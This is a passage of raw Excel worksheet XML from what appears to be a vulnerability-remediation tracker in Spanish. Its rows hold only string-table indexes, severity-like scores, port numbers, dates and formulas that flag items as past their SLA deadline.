      <c r="AD345" s="32" t="s">
        <v>1415</v>
      </c>
      <c r="AE345" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF345" s="9"/>
      <c r="AG345" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH345" t="str">
        <f>IFERROR(VLOOKUP(H345,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="346" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A346" s="5">
        <v>345</v>
      </c>
      <c r="B346" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C346" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D346" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E346" s="4"/>
      <c r="F346" s="4"/>
      <c r="G346" s="6" t="s">
        <v>1416</v>
      </c>
      <c r="H346" s="4" t="s">
        <v>1417</v>
      </c>
      <c r="I346" s="4"/>
      <c r="J346" s="4" t="s">
        <v>560</v>
      </c>
      <c r="K346" s="4"/>
      <c r="L346" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M346" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N346" s="7">
        <v>4.3</v>
      </c>
      <c r="O346" s="6"/>
      <c r="P346" s="4"/>
      <c r="Q346" s="4" t="s">
        <v>1418</v>
      </c>
      <c r="R346" s="4"/>
      <c r="S346" s="22"/>
      <c r="T346" s="8">
        <v>44975</v>
      </c>
      <c r="U346" s="55">
        <f t="shared" ca="1" si="15"/>
        <v>1234</v>
      </c>
      <c r="V346" s="8">
        <f t="shared" si="16"/>
        <v>45065</v>
      </c>
      <c r="W346" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X346" s="12"/>
      <c r="Y346" s="30"/>
      <c r="Z346" s="30"/>
      <c r="AA346" s="8"/>
      <c r="AB346" s="9" t="s">
        <v>1419</v>
      </c>
      <c r="AC346" s="32" t="s">
        <v>1420</v>
      </c>
      <c r="AD346" s="32" t="s">
        <v>1421</v>
      </c>
      <c r="AE346" s="27"/>
      <c r="AF346" s="9"/>
      <c r="AG346" s="27" t="s">
        <v>1422</v>
      </c>
      <c r="AH346" t="str">
        <f>IFERROR(VLOOKUP(H346,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="347" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A347" s="5">
        <v>346</v>
      </c>
      <c r="B347" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C347" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D347" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E347" s="4"/>
      <c r="F347" s="4"/>
      <c r="G347" s="6" t="s">
        <v>1416</v>
      </c>
      <c r="H347" s="4" t="s">
        <v>1423</v>
      </c>
      <c r="I347" s="6" t="s">
        <v>1424</v>
      </c>
      <c r="J347" s="4" t="s">
        <v>1192</v>
      </c>
      <c r="K347" s="4"/>
      <c r="L347" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M347" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N347" s="42">
        <v>3.0999999046325684</v>
      </c>
      <c r="O347" s="6"/>
      <c r="P347" s="6"/>
      <c r="Q347" s="6" t="s">
        <v>1425</v>
      </c>
      <c r="R347" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S347" s="22"/>
      <c r="T347" s="8">
        <v>45434.406782407408</v>
      </c>
      <c r="U347" s="55">
        <f t="shared" ca="1" si="15"/>
        <v>774.59321759259183</v>
      </c>
      <c r="V347" s="8">
        <f t="shared" si="16"/>
        <v>45554.406782407408</v>
      </c>
      <c r="W347" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X347" s="11"/>
      <c r="Y347" s="11"/>
      <c r="Z347" s="11"/>
      <c r="AA347" s="8"/>
      <c r="AB347" s="9" t="s">
        <v>1427</v>
      </c>
      <c r="AC347" s="32" t="s">
        <v>1428</v>
      </c>
      <c r="AD347" s="36" t="s">
        <v>1429</v>
      </c>
      <c r="AE347" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF347" s="9"/>
      <c r="AG347" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH347" t="str">
        <f>IFERROR(VLOOKUP(H347,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="348" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A348" s="5">
        <v>347</v>
      </c>
      <c r="B348" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C348" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D348" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E348" s="4"/>
      <c r="F348" s="4"/>
      <c r="G348" s="6" t="s">
        <v>1416</v>
      </c>
      <c r="H348" s="4" t="s">
        <v>1430</v>
      </c>
      <c r="I348" s="6" t="s">
        <v>1431</v>
      </c>
      <c r="J348" s="4" t="s">
        <v>214</v>
      </c>
      <c r="K348" s="4"/>
      <c r="L348" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M348" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N348" s="42">
        <v>3.5</v>
      </c>
      <c r="O348" s="6"/>
      <c r="P348" s="6"/>
      <c r="Q348" s="6" t="s">
        <v>1425</v>
      </c>
      <c r="R348" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S348" s="22"/>
      <c r="T348" s="8">
        <v>44784.495150462964</v>
      </c>
      <c r="U348" s="55">
        <f t="shared" ca="1" si="15"/>
        <v>1424.5048495370356</v>
      </c>
      <c r="V348" s="8">
        <f t="shared" si="16"/>
        <v>44904.495150462964</v>
      </c>
      <c r="W348" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X348" s="11"/>
      <c r="Y348" s="11"/>
      <c r="Z348" s="11"/>
      <c r="AA348" s="8"/>
      <c r="AB348" s="9" t="s">
        <v>1432</v>
      </c>
      <c r="AC348" s="32" t="s">
        <v>1433</v>
      </c>
      <c r="AD348" s="32" t="s">
        <v>1141</v>
      </c>
      <c r="AE348" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF348" s="9"/>
      <c r="AG348" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH348" t="str">
        <f>IFERROR(VLOOKUP(H348,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="349" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A349" s="5">
        <v>348</v>
      </c>
      <c r="B349" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C349" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D349" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E349" s="4"/>
      <c r="F349" s="4"/>
      <c r="G349" s="6" t="s">
        <v>1416</v>
      </c>
      <c r="H349" s="4" t="s">
        <v>1434</v>
      </c>
      <c r="I349" s="6" t="s">
        <v>1435</v>
      </c>
      <c r="J349" s="4" t="s">
        <v>910</v>
      </c>
      <c r="K349" s="4"/>
      <c r="L349" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M349" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N349" s="42">
        <v>3.5</v>
      </c>
      <c r="O349" s="6"/>
      <c r="P349" s="6"/>
      <c r="Q349" s="6" t="s">
        <v>1425</v>
      </c>
      <c r="R349" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S349" s="22"/>
      <c r="T349" s="8">
        <v>44784.49423611111</v>
      </c>
      <c r="U349" s="55">
        <f t="shared" ca="1" si="15"/>
        <v>1424.5057638888902</v>
      </c>
      <c r="V349" s="8">
        <f t="shared" si="16"/>
        <v>44904.49423611111</v>
      </c>
      <c r="W349" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X349" s="11"/>
      <c r="Y349" s="11"/>
      <c r="Z349" s="11"/>
      <c r="AA349" s="8"/>
      <c r="AB349" s="9" t="s">
        <v>1436</v>
      </c>
      <c r="AC349" s="32" t="s">
        <v>1437</v>
      </c>
      <c r="AD349" s="32" t="s">
        <v>905</v>
      </c>
      <c r="AE349" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF349" s="9"/>
      <c r="AG349" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH349" t="str">
        <f>IFERROR(VLOOKUP(H349,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="350" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A350" s="5">
        <v>349</v>
      </c>
      <c r="B350" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C350" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D350" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E350" s="4"/>
      <c r="F350" s="4"/>
      <c r="G350" s="6" t="s">
        <v>1416</v>
      </c>
      <c r="H350" s="4" t="s">
        <v>1438</v>
      </c>
      <c r="I350" s="6" t="s">
        <v>1439</v>
      </c>
      <c r="J350" s="4" t="s">
        <v>1440</v>
      </c>
      <c r="K350" s="4"/>
      <c r="L350" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M350" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N350" s="42">
        <v>3.7000000476837158</v>
      </c>
      <c r="O350" s="6"/>
      <c r="P350" s="4"/>
      <c r="Q350" s="6" t="s">
        <v>1425</v>
      </c>
      <c r="R350" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S350" s="22"/>
      <c r="T350" s="8">
        <v>45434.405127314814</v>
      </c>
      <c r="U350" s="55">
        <f t="shared" ca="1" si="15"/>
        <v>774.59487268518569</v>
      </c>
      <c r="V350" s="8">
        <f t="shared" si="16"/>
        <v>45554.405127314814</v>
      </c>
      <c r="W350" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X350" s="12"/>
      <c r="Y350" s="12"/>
      <c r="Z350" s="12"/>
      <c r="AA350" s="8"/>
      <c r="AB350" s="9" t="s">
        <v>1441</v>
      </c>
      <c r="AC350" s="32" t="s">
        <v>1442</v>
      </c>
      <c r="AD350" s="32" t="s">
        <v>1443</v>
      </c>
      <c r="AE350" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF350" s="27"/>
      <c r="AG350" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH350" t="str">
        <f>IFERROR(VLOOKUP(H350,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="351" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A351" s="5">
        <v>350</v>
      </c>
      <c r="B351" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C351" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D351" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E351" s="4"/>
      <c r="F351" s="4"/>
      <c r="G351" s="6" t="s">
        <v>1416</v>
      </c>
      <c r="H351" s="4"/>
      <c r="I351" s="4"/>
      <c r="J351" s="4" t="s">
        <v>1444</v>
      </c>
      <c r="K351" s="4"/>
      <c r="L351" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M351" s="5" t="s">
        <v>427</v>
      </c>
      <c r="N351" s="5"/>
      <c r="O351" s="6"/>
      <c r="P351" s="6"/>
      <c r="Q351" s="4" t="s">
        <v>1425</v>
      </c>
      <c r="R351" s="4">
        <v>443</v>
      </c>
      <c r="S351" s="22"/>
      <c r="T351" s="8">
        <v>45520</v>
      </c>
      <c r="U351" s="55">
        <f t="shared" ca="1" si="15"/>
        <v>689</v>
      </c>
      <c r="V351" s="8">
        <f t="shared" si="16"/>
        <v>45640</v>
      </c>
      <c r="W351" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X351" s="12"/>
      <c r="Y351" s="12"/>
      <c r="Z351" s="12"/>
      <c r="AA351" s="13"/>
      <c r="AB351" s="9" t="s">
        <v>1445</v>
      </c>
      <c r="AC351" s="32" t="s">
        <v>1446</v>
      </c>
      <c r="AD351" s="32"/>
      <c r="AE351" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF351" s="9"/>
      <c r="AG351" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH351" t="str">
        <f>IFERROR(VLOOKUP(H351,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="352" spans="1:34" ht="304.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A352" s="5">
        <v>351</v>
      </c>
      <c r="B352" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C352" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D352" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E352" s="4"/>
      <c r="F352" s="4"/>
      <c r="G352" s="6" t="s">
        <v>1416</v>
      </c>
      <c r="H352" s="4" t="s">
        <v>1447</v>
      </c>
      <c r="I352" s="6" t="s">
        <v>1448</v>
      </c>
      <c r="J352" s="4" t="s">
        <v>1449</v>
      </c>
      <c r="K352" s="4"/>
      <c r="L352" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M352" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N352" s="5">
        <v>3.9</v>
      </c>
      <c r="O352" s="14" t="s">
        <v>1450</v>
      </c>
      <c r="P352" s="6"/>
      <c r="Q352" s="4" t="s">
        <v>1425</v>
      </c>
      <c r="R352" s="4"/>
      <c r="S352" s="22"/>
      <c r="T352" s="8">
        <v>45590</v>
      </c>
      <c r="U352" s="55">
        <f t="shared" ca="1" si="15"/>
        <v>619</v>
      </c>
      <c r="V352" s="8">
        <f t="shared" si="16"/>
        <v>45710</v>
      </c>
      <c r="W352" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X352" s="11"/>
      <c r="Y352" s="11"/>
      <c r="Z352" s="11"/>
      <c r="AA352" s="8"/>
      <c r="AB352" s="9" t="s">
        <v>1451</v>
      </c>
      <c r="AC352" s="32" t="s">
        <v>1452</v>
      </c>
      <c r="AD352" s="32" t="s">
        <v>1453</v>
      </c>
      <c r="AE352" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF352" s="9"/>
      <c r="AG352" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH352" t="str">
        <f>IFERROR(VLOOKUP(H352,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="353" spans="1:34" ht="232" hidden="1" x14ac:dyDescent="0.35">
      <c r="A353" s="5">
        <v>352</v>
      </c>
      <c r="B353" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C353" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D353" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E353" s="4"/>
      <c r="F353" s="4"/>
      <c r="G353" s="6" t="s">
        <v>1416</v>
      </c>
      <c r="H353" s="4" t="s">
        <v>1454</v>
      </c>
      <c r="I353" s="6" t="s">
        <v>1455</v>
      </c>
      <c r="J353" s="4" t="s">
        <v>1456</v>
      </c>
      <c r="K353" s="4"/>
      <c r="L353" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M353" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N353" s="5">
        <v>3.9</v>
      </c>
      <c r="O353" s="6" t="s">
        <v>1457</v>
      </c>
      <c r="P353" s="6"/>
      <c r="Q353" s="4" t="s">
        <v>1425</v>
      </c>
      <c r="R353" s="4"/>
      <c r="S353" s="22"/>
      <c r="T353" s="8">
        <v>45591</v>
      </c>
      <c r="U353" s="55">
        <f t="shared" ca="1" si="15"/>
        <v>618</v>
      </c>
      <c r="V353" s="8">
        <f t="shared" si="16"/>
        <v>45711</v>
      </c>
      <c r="W353" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X353" s="11"/>
      <c r="Y353" s="11"/>
      <c r="Z353" s="11"/>
      <c r="AA353" s="8"/>
      <c r="AB353" s="9" t="s">
        <v>1458</v>
      </c>
      <c r="AC353" s="32" t="s">
        <v>1459</v>
      </c>
      <c r="AD353" s="32" t="s">
        <v>1453</v>
      </c>
      <c r="AE353" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF353" s="9"/>
      <c r="AG353" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH353" t="str">
        <f>IFERROR(VLOOKUP(H353,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="354" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A354" s="5">
        <v>353</v>
      </c>
      <c r="B354" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C354" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D354" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E354" s="4"/>
      <c r="F354" s="4"/>
      <c r="G354" s="6" t="s">
        <v>1416</v>
      </c>
      <c r="H354" s="9" t="s">
        <v>1460</v>
      </c>
      <c r="I354" s="6"/>
      <c r="J354" s="4" t="s">
        <v>1358</v>
      </c>
      <c r="K354" s="4"/>
      <c r="L354" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M354" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N354" s="5" t="s">
        <v>1359</v>
      </c>
      <c r="O354" s="6"/>
      <c r="P354" s="6"/>
      <c r="Q354" s="9" t="s">
        <v>1461</v>
      </c>
      <c r="R354" s="4"/>
      <c r="S354" s="22"/>
      <c r="T354" s="8">
        <v>45605</v>
      </c>
      <c r="U354" s="55">
        <f t="shared" ca="1" si="15"/>
        <v>604</v>
      </c>
      <c r="V354" s="8">
        <f t="shared" si="16"/>
        <v>45695</v>
      </c>
      <c r="W354" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X354" s="11"/>
      <c r="Y354" s="11"/>
      <c r="Z354" s="11"/>
      <c r="AA354" s="8"/>
      <c r="AB354" s="9" t="s">
        <v>1462</v>
      </c>
      <c r="AC354" s="32" t="s">
        <v>950</v>
      </c>
      <c r="AD354" s="32"/>
      <c r="AE354" s="27"/>
      <c r="AF354" s="9"/>
      <c r="AG354" s="27" t="s">
        <v>1422</v>
      </c>
      <c r="AH354" t="str">
        <f>IFERROR(VLOOKUP(H354,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="355" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A355" s="5">
        <v>354</v>
      </c>
      <c r="B355" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C355" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D355" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E355" s="4"/>
      <c r="F355" s="4"/>
      <c r="G355" s="6" t="s">
        <v>755</v>
      </c>
      <c r="H355" s="9" t="s">
        <v>1463</v>
      </c>
      <c r="I355" s="6"/>
      <c r="J355" s="4" t="s">
        <v>560</v>
      </c>
      <c r="K355" s="4"/>
      <c r="L355" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M355" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N355" s="5">
        <v>4.0999999999999996</v>
      </c>
      <c r="O355" s="6"/>
      <c r="P355" s="6"/>
      <c r="Q355" s="4" t="s">
        <v>759</v>
      </c>
      <c r="R355" s="4"/>
      <c r="S355" s="22"/>
      <c r="T355" s="8">
        <v>45765</v>
      </c>
      <c r="U355" s="55">
        <f t="shared" ca="1" si="15"/>
        <v>444</v>
      </c>
      <c r="V355" s="8">
        <f t="shared" si="16"/>
        <v>45855</v>
      </c>
      <c r="W355" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X355" s="11"/>
      <c r="Y355" s="11"/>
      <c r="Z355" s="11"/>
      <c r="AA355" s="8"/>
      <c r="AB355" s="9" t="s">
        <v>1464</v>
      </c>
      <c r="AC355" s="32" t="s">
        <v>1465</v>
      </c>
      <c r="AD355" s="32"/>
      <c r="AE355" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF355" s="9"/>
      <c r="AG355" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH355" t="str">
        <f>IFERROR(VLOOKUP(H355,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="356" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A356" s="5">
        <v>355</v>
      </c>
      <c r="B356" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C356" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D356" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E356" s="4"/>
      <c r="F356" s="4"/>
      <c r="G356" s="6" t="s">
        <v>755</v>
      </c>
      <c r="H356" s="9" t="s">
        <v>1466</v>
      </c>
      <c r="I356" s="6"/>
      <c r="J356" s="4" t="s">
        <v>574</v>
      </c>
      <c r="K356" s="4"/>
      <c r="L356" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M356" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N356" s="5">
        <v>5.2</v>
      </c>
      <c r="O356" s="6"/>
      <c r="P356" s="6"/>
      <c r="Q356" s="4" t="s">
        <v>1467</v>
      </c>
      <c r="R356" s="4"/>
      <c r="S356" s="22"/>
      <c r="T356" s="8">
        <v>45765</v>
      </c>
      <c r="U356" s="55">
        <f t="shared" ca="1" si="15"/>
        <v>444</v>
      </c>
      <c r="V356" s="8">
        <f t="shared" si="16"/>
        <v>45855</v>
      </c>
      <c r="W356" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X356" s="11"/>
      <c r="Y356" s="11"/>
      <c r="Z356" s="11"/>
      <c r="AA356" s="8"/>
      <c r="AB356" s="9" t="s">
        <v>1364</v>
      </c>
      <c r="AC356" s="32" t="s">
        <v>991</v>
      </c>
      <c r="AD356" s="32"/>
      <c r="AE356" s="27"/>
      <c r="AF356" s="9"/>
      <c r="AG356" s="27" t="s">
        <v>1422</v>
      </c>
      <c r="AH356" t="str">
        <f>IFERROR(VLOOKUP(H356,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="357" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A357" s="5">
        <v>356</v>
      </c>
      <c r="B357" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C357" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D357" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E357" s="4"/>
      <c r="F357" s="4"/>
      <c r="G357" s="6" t="s">
        <v>1416</v>
      </c>
      <c r="J357" s="54" t="s">
        <v>1175</v>
      </c>
      <c r="L357" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M357" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N357" s="5" t="s">
        <v>1359</v>
      </c>
      <c r="Q357" s="9" t="s">
        <v>1461</v>
      </c>
      <c r="R357">
        <v>443</v>
      </c>
      <c r="T357" s="1">
        <v>45758</v>
      </c>
      <c r="U357" s="55">
        <f t="shared" ca="1" si="15"/>
        <v>451</v>
      </c>
      <c r="V357" s="8">
        <f t="shared" si="16"/>
        <v>45848</v>
      </c>
      <c r="W357" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AG357" s="27" t="s">
        <v>1422</v>
      </c>
      <c r="AH357" t="str">
        <f>IFERROR(VLOOKUP(H357,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="358" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A358" s="5">
        <v>357</v>
      </c>
      <c r="B358" s="9" t="s">
        <v>32</v>
      </c>
      <c r="C358" s="9" t="s">
        <v>33</v>
      </c>
      <c r="D358" s="9" t="s">
        <v>34</v>
      </c>
      <c r="E358" s="9"/>
      <c r="F358" s="9"/>
      <c r="G358" s="9" t="s">
        <v>171</v>
      </c>
      <c r="H358" s="9"/>
      <c r="I358" s="9" t="s">
        <v>1468</v>
      </c>
      <c r="J358" s="9" t="s">
        <v>1469</v>
      </c>
      <c r="K358" s="9"/>
      <c r="L358" s="9" t="s">
        <v>655</v>
      </c>
      <c r="M358" s="9" t="s">
        <v>1470</v>
      </c>
      <c r="N358" s="9" t="s">
        <v>1471</v>
      </c>
      <c r="O358" s="9"/>
      <c r="P358" s="9"/>
      <c r="Q358" s="9" t="s">
        <v>1472</v>
      </c>
      <c r="R358" s="9"/>
      <c r="S358" s="9"/>
      <c r="T358" s="1">
        <v>45804</v>
      </c>
      <c r="U358" s="55">
        <f t="shared" ca="1" si="15"/>
        <v>405</v>
      </c>
      <c r="V358" s="8">
        <f t="shared" si="16"/>
        <v>45924</v>
      </c>
      <c r="W358" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X358" s="9"/>
      <c r="Y358" s="9"/>
      <c r="Z358" s="9"/>
      <c r="AA358" s="9"/>
      <c r="AB358" s="9" t="s">
        <v>1473</v>
      </c>
      <c r="AC358" s="9" t="s">
        <v>1474</v>
      </c>
      <c r="AD358" s="9" t="s">
        <v>1475</v>
      </c>
      <c r="AE358" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF358" s="9"/>
      <c r="AG358" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH358" t="str">
        <f>IFERROR(VLOOKUP(H358,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="359" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A359" s="5">
        <v>358</v>
      </c>
      <c r="B359" s="9" t="s">
        <v>32</v>
      </c>
      <c r="C359" s="9" t="s">
        <v>33</v>
      </c>
      <c r="D359" s="9" t="s">
        <v>34</v>
      </c>
      <c r="E359" s="9"/>
      <c r="F359" s="9"/>
      <c r="G359" s="9" t="s">
        <v>171</v>
      </c>
      <c r="H359" s="9"/>
      <c r="I359" s="9" t="s">
        <v>1476</v>
      </c>
      <c r="J359" s="9" t="s">
        <v>1477</v>
      </c>
      <c r="K359" s="9"/>
      <c r="L359" s="9" t="s">
        <v>655</v>
      </c>
      <c r="M359" s="9" t="s">
        <v>1470</v>
      </c>
      <c r="N359" s="9" t="s">
        <v>1478</v>
      </c>
      <c r="O359" s="9"/>
      <c r="P359" s="9"/>
      <c r="Q359" s="9" t="s">
        <v>1479</v>
      </c>
      <c r="R359" s="9"/>
      <c r="S359" s="9"/>
      <c r="T359" s="1">
        <v>45804</v>
      </c>
      <c r="U359" s="55">
        <f t="shared" ca="1" si="15"/>
        <v>405</v>
      </c>
      <c r="V359" s="8">
        <f t="shared" si="16"/>
        <v>45924</v>
      </c>
      <c r="W359" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X359" s="9"/>
      <c r="Y359" s="9"/>
      <c r="Z359" s="9"/>
      <c r="AA359" s="9"/>
      <c r="AB359" s="9" t="s">
        <v>1480</v>
      </c>
      <c r="AC359" s="9" t="s">
        <v>1481</v>
      </c>
      <c r="AD359" s="9" t="s">
        <v>1482</v>
      </c>
      <c r="AE359" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF359" s="9"/>
      <c r="AG359" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH359" t="str">
        <f>IFERROR(VLOOKUP(H359,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="360" spans="1:34" ht="217.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A360" s="5">
        <v>359</v>
      </c>
      <c r="B360" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C360" s="50" t="s">
        <v>425</v>
      </c>
      <c r="D360" s="50" t="s">
        <v>34</v>
      </c>
      <c r="E360" s="9"/>
      <c r="F360" s="9"/>
      <c r="G360" s="60" t="s">
        <v>1416</v>
      </c>
      <c r="H360" s="9"/>
      <c r="I360" s="9"/>
      <c r="J360" s="9" t="s">
        <v>1483</v>
      </c>
      <c r="K360" s="9"/>
      <c r="L360" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M360" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N360" s="9"/>
      <c r="O360" s="9"/>
      <c r="P360" s="9"/>
      <c r="Q360" s="9" t="s">
        <v>1425</v>
      </c>
      <c r="R360" s="9"/>
      <c r="S360" s="9"/>
      <c r="T360" s="61">
        <v>45646</v>
      </c>
      <c r="U360" s="55">
        <f t="shared" ca="1" si="15"/>
        <v>563</v>
      </c>
      <c r="V360" s="8">
        <f t="shared" si="16"/>
        <v>45766</v>
      </c>
      <c r="W360" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X360" s="9"/>
      <c r="Y360" s="9"/>
      <c r="Z360" s="9"/>
      <c r="AA360" s="9"/>
      <c r="AB360" s="9" t="s">
        <v>1484</v>
      </c>
      <c r="AC360" s="9" t="s">
        <v>1485</v>
      </c>
      <c r="AD360" s="9"/>
      <c r="AE360" s="9"/>
      <c r="AF360" s="9"/>
      <c r="AG360" s="27" t="s">
        <v>1422</v>
      </c>
      <c r="AH360" t="str">
        <f>IFERROR(VLOOKUP(H360,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="361" spans="1:34" ht="130.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A361" s="5">
        <v>360</v>
      </c>
      <c r="B361" s="50" t="s">
